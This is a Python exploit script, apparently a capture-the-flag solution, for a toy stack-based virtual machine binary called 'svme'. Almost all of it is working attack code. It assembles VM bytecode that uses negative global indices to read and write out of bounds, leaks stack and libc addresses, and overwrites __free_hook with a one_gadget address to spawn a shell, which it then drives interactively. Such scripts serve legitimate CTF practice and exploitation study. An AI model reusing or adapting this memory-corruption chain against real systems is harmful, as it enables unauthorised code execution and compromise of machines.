#!/usr/bin/env python3
from dn3 import *
from time import sleep

exe = ELF("./svme")
libc = ELF("./libc-2.31.so")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"
#context.aslr = False

global io
breakpoints = '''
break *0x5555555556B7
break *0x555555555755
'''+"continue\n"*10

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path,gdbscript=breakpoints)
    
DeathNot3(io)

opcodes = {"add":1, "sub":2, "mul":3, "ilt":4, "ieq":5, "br":6, "brt":7, 
           "brf":8, "iconst":9, "load":10, "gload":11, "store":12, 
           "gstore":13, "print":14, "pop":15, "call":16, "ret":17, "hlt":18}

def negative(x):
    return 0xffffffff-x+1

def assemble(shellcode):
    bincode = ""
    for i in shellcode.split("\n"):
        if i == "":
            continue
        ins = i.split()
        bincode += pk32(opcodes[ins.pop(0)])
        while len(ins) > 0:
            if "//" in ins[0]:
                break
            bincode += pk32(int(ins.pop(0)))
    return bincode

one_gadget = 0xe6c81
free_hook_offset = libc.symbols["__free_hook"]-libc.symbols["__libc_start_main"]-243
one_gadget_offset = one_gadget-libc.symbols["_IO_file_seekoff"]

shellcode = assemble(f"""

gload {negative(0x83f)}                 // read stack address from vm->code
gload {negative(0x840)}

store {negative(0x3e1)}                 // overwrite vm->global with vm->code
store {negative(0x3e0)}

gload {0x21}                            // read one_gadget_offset
gload {0x86}                            // read __libc_start_main+243 address from stack
gload {0x20}                            // read free_hook_offset
add                                     // add to get __free_hook
gload {0x87}                            // read upper 4 bytes of libc address

store {negative(0x3e0)}                 // overwrite vm->global with __free_hook
store {negative(0x3e1)}

gload {negative(0x800)}                 // get _IO_file_seekoff address
add                                     // add to get one_gdaget
gload {negative(0x801)}                 // read upper 4 bytes of libc address

gstore {1}                              // overwrite __free_hook with one_gadget
gstore {0}

hlt 
store {free_hook_offset} {one_gadget_offset} // input offsets to be used later


""").ljust(512,"\x00")

s(shellcode)

interactive()